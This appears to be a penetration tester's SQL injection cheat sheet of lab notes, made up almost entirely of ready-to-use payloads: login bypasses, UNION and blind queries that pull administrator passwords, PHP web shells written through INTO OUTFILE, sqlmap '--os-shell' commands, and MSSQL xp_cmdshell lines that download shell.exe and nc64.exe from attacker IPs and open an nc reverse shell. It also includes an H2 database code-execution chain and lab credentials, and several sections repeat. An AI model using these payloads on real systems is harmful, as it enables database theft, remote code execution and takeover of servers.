# SQL Injection

Dense operator workflow page for manual SQLi validation and automated exploitation.
Keep payload shaping, DB-specific behavior, file/system interaction, and post-enumeration decision support in one place.

## Quick Payloads and First Probes

```sql
// SIMPLE

';#---              // insert everywhere! Shoutout to xsudoxx!
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1\`='1-
'
administrator'
' OR 1=1--
'; waitfor delay ('0:0:20')--

// AUTH BYPASS

'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
' || '1'='1';-- -
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
```
```sql
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
```
```sql
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
```
```sql
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
' order by 3--
' union select null,table_name,null from all_tables--
' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--

-- 'information_schema.tables' is only valid on MySQL, PostgreSQL, MSSQL, etc... (non-Oracle) On Oracle, you use 'all_tables' and 'all_tab_columns'
-1 union select 1,2,version();#
-1 union select 1,2,database();#
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
SELECT LOAD_FILE('/etc/passwd')
-1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--

// NON-ORACLE

SELECT * FROM information_schema.tables
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--                '
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_djhjln'--           '
'+UNION+SELECT+username_janffq,+password_sijonm+FROM+users_djhjln--           '

// ORACLE

SELECT * FROM all_tables
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--                                                     '
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_CJUINS'--             '
'+UNION+SELECT+USERNAME_VEWZAL,+PASSWORD_ERQRLB+FROM+USERS_CJUINS--         '

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
SELECT name, description FROM products WHERE category = 'Gifts'
UNION SELECT username, password FROM users--
'+UNION+SELECT+username_janffq,+password_sijonm+FROM+users_djhjln--                        '

https://insecure-website.com/products?category=Gifts
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
https://insecure-website.com/products?category=Gifts'--
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
https://insecure-website.com/products?category=Gifts'+OR+1=1--
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

// VERSIONS

SELECT * FROM v$version --- Oracle
'+UNION+SELECT+'abc','def'+FROM+dual--    '--- dual is a dummy Oracle table,Shows how many columns are being returned
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--                                    '

SELECT @@version --- Microsfot & MySQL
' UNION SELECT @@version--                                                        '
'+UNION+SELECT+'abc','def'+FROM+dual#                                                 '
'+UNION+SELECT+@@version,+NULL#                                                       '

SELECT version() --- PostgreSQL

// UNIONS --- also see usage above
SELECT a, b FROM table1 UNION SELECT c, d FROM table2    --- Basic usage
--- method 1 to determine # of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--                                                                     '
--- method 2 to determine # of columns
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--                                                    '
' UNION SELECT NULL FROM DUAL--                           '--- Oracle specific, SELECT must use FROM query
--- Find columns with useful data type
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
--- retrieve multiple values within a single column
' UNION SELECT username || ':' || password FROM users--                               '

// XML ESCAPE

<stockCheck>
	<productId>123</productId>
	<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
--- example below bypasses WAF and concatenates username and password with ':'. Use Hackvertor on BurpSuite to get tags (hex_entities OR dec_entities)
<storeId><@hex_entities>1 UNION SELECT username || ':' || password FROM users</@hex_entities></storeId>

// BLIND SQLi (Cookie: TrackingId=xyz)

TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 's
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a --- When no "Welcome Back!" message on 20 we know the password is 20 characters
--- In Burp Intruder, Sniper attack a-z,0-9 and do for all 20 characters. Intruder > Settings > Grep Match > delete all and enter "Welcome back" or whatever error to signify success
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='$a$
TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='$a$
--- Exploiting blind SQLi by triggering conditional errors
TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
TrackingId=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
TrackingId=xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
TrackingId=xyz'||(SELECT '')||'
TrackingId=xyz'||(SELECT '' FROM dual)||'     --- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'      --- Oracle, if true it 1/0 and errors
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'      --- Oracle, if false, it ends with no error
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'        --- Returns error if entry administrator in users table exists
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'        -- Oracle, determine password length: 1
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'        -- Oracle, determine password length: 2
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'        -- Oracle, determine password length: 3, etc. When no more error, that is the length
--- In Burp Intruder, Sniper attack a-z,0-9 and do for all 20 characters. Intruder > Settings > Grep Match > delete all and enter "Internal Server Error" or whatever error to signify success
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
--- Blind: Visible error-based SQLi
TrackingId='+AND+1=CAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)--
TrackingId='+AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--

// WEB SHELL

LOAD_FILE('/etc/httpd/conf/httpd.conf')
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";

LOAD_FILE('/etc/httpd/conf/httpd.conf')
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```

## SQLMap

```
# Run SQLMap without asking for user input
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# SQLMap with POST request specifying an unjection point with asterisk
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

# Passing an HTTP request file to SQLMap
sqlmap -r req.txt

# Specifying a PUT request
sqlmap -u www.target.com --data='id=1' --method PUT

# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# List all tamper scripts
sqlmap --list-tampers

# Writing a file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Spawn a shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

## SQL Injection (SQLi)

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

- [SQLi Documentation](https://app.gitbook.com/o/BgiuuSDIn1hp261fZTz5/s/skdByKhrTDrekGP0vU0U/readme/webapp/sqli)
- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- `/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt`
- `/usr/share/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt`
```SQL
-- Username payloads
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
'='
'LIKE'
'=0--+
```

## UNION-based Payloads

- [Previous Enumeration Steps](https://app.gitbook.com/o/BgiuuSDIn1hp261fZTz5/s/skdByKhrTDrekGP0vU0U/checklists/methodology-checklist/1.0-enumeration)

---

## Exploitation

```
';EXEC master.dbo.xp_cmdshell 'ping 192.168.119.184';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.119.184:443/shell.exe C:\\Windows\temp\shell.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
```

## vulnerable code

```
found a db.php file/directory. In this case fuzzed with ffuf, the example in our ffuf bruteforcing login pages will help on this

<?php

include 'dbconnection.php';
$userid = $_POST['userid'];
$password = $_POST['password'];
$sql =
"SELECT * FROM users WHERE username = '$userid' AND password = '$password'";
$result = mysqli_query($db, $sql) or die(mysqli_error($db));
$num = mysqli_fetch_array($result);

if($num > 0) {
    echo "Login Success";
}
else {
    echo "Wrong User id or password";
}
?>

admin' -- ' --
```

[![](https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png)](https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png)

```
Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network

admin ' OR 1=1 --

1' OR 1 = 1#

admin ' OR 1=1 --

https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html

'
Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated
' OR 1=1 -- #query
Blog entry from USERA with title The Great Escape from 2017
Blog entry from USERB with title I Love Crypto from 2016
Blog entry from USERC with title Man-in-the-middle from 2018
Blog entry from USERA with title To Paris and Back from 2019
Blog entry from Maria with title Software Development Lifecycle from 2018
Blog entry from Eric with title Accounting is Fun from 2019
' union select 1,2,3,4,5,6-- #query
java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
 ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
 ' union select 1,2,3 from dual-- #adjusted columns
java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression
 ' union select null,null,null from dual-- #query
Blog entry from null with title null from 0
' union select user,null,null from dual-- #query
Blog entry from example_APP with title null from 0
' union select table_name,null,null from all_tables-- #query
Blog entry from example_ADMINS with title null from 0
Blog entry from example_CONTENT with title null from 0
Blog entry from example_USERS with title null from 0
' union select column_name,null,null from all_tab_columns where table_name='example_ADMINS'-- #query
Blog entry from ADMIN_ID with title null from 0
Blog entry from ADMIN_NAME with title null from 0
Blog entry from PASSWORD with title null from 0
' union select ADMIN_NAME||PASSWORD,null,null from example_ADMINS-- #query
Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
```

## Reference Sheet

```
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
```

[![](https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png)](https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png)

## Example Case

```
' #Entered
Unclosed quotation mark after the character string '',')'. #response

insert into dbo.tablename ('','');
#two statements Username and Email. Web Server says User added which indicates an insert statement
#we want to imagine what the query could potentially look like so we did a mock example above
insert into dbo.tablename (''',); #this would be created as an example of the error message above

insert into dbo.tablename ('1 AND 1=CONVERT(INT,@@version))--' ,''); #This is what is looks like
insert into dbo.tablename('',1 AND 1=CONVERT(INT,@@version))-- #Correct payload based on the above
',1 AND 1=CONVERT(INT,@@version))-- #Enumerate the DB
Server Error in '/Newsletter' Application.#Response
Incorrect syntax near the keyword 'AND'. #Response
',CONVERT(INT,@@version))-- #Corrected Payoad to adjust for the error

', CONVERT(INT,db_name(1)))--
master
', CONVERT(INT,db_name(2)))--
tempdb
', CONVERT(INT,db_name(3)))--
model
', CONVERT(INT,db_name(4)))--
msdb
', CONVERT(INT,db_name(5)))--
newsletter
', CONVERT(INT,db_name(6)))--
archive

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
pEXAMPLE

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE')+CHAR(58)+CHAR(58))))--
3 entries

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
alogin

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
id

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
psw

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
3c744b99b8623362b466efb7203fd182

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
5b413fe170836079622f4131fe6efa2d

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
7de6b6f0afadd89c3ed558da43930181

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
cb2d5be3c78be06d47b697468ad3b33b
```

## xp\_cmdshell

```
netexec mssql 10.10.137.148 -u sql_svc -p Dolphin1
impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth

# option from Nagoya
enable_xp_cmdshell
xp_cmdshell whoami

# Classic from the course
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```

---

## SQLi

```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```
```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```
💡 We can find webshell location to upload in phpinfo (.php) DOCUMENT\_ROOT

## xp\_cmdshell

```
netexec mssql 10.10.137.148 -u sql_svc -p Dolphin1
impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth

# option from Nagoya
enable_xp_cmdshell
xp_cmdshell whoami

# Classic from the course
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```

Port 8082 - Java SQL H2 Web DB
- H2 version 1.4.199
	- https://www.exploit-db.com/exploits/49384
```sql
-- Write native library
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00),CHAR(0x03)....,CHAR(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');

-- Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');

--- Create msfvenom payload and curl it instead of whoami
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -f -urlcache -split \"http://192.168.45.165/daddyGIGS.exe\" \"C:\\Windows\\Temp\\daddyGIGS.exe\"").getInputStream()).useDelimiter("\\Z").next()');CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\Temp\\daddyGIGS.exe").getInputStream()).useDelimiter("\\Z").next()');
```
- H2 version 1.4.196 and EARLIER
- we can use `SELECT FILE_READ()` to read files... Also:
	- **FILE_READ:** Returns the contents of a file. **_(function)_**
	- **FILE_WRITE:** Write the supplied parameter into a file.**_(function)_**
	- **CSVWRITE:** Writes a CSV (comma separated values). **_(function)_**
	- **CREATE ALIAS:** Creates a new function alias. **_(command)._**
```c
python h2-exploit.py -H <ip>:<port> -d jdbc:h2:~/test
```
or
```SQL
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException {
java.util.Scanner s = new
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");
return s.hasNext() ? s.next() : "";  }$$;
```

---

## SQL Injection (SQLi)

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

- [SQLi Documentation](https://app.gitbook.com/o/BgiuuSDIn1hp261fZTz5/s/skdByKhrTDrekGP0vU0U/readme/webapp/sqli)
- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
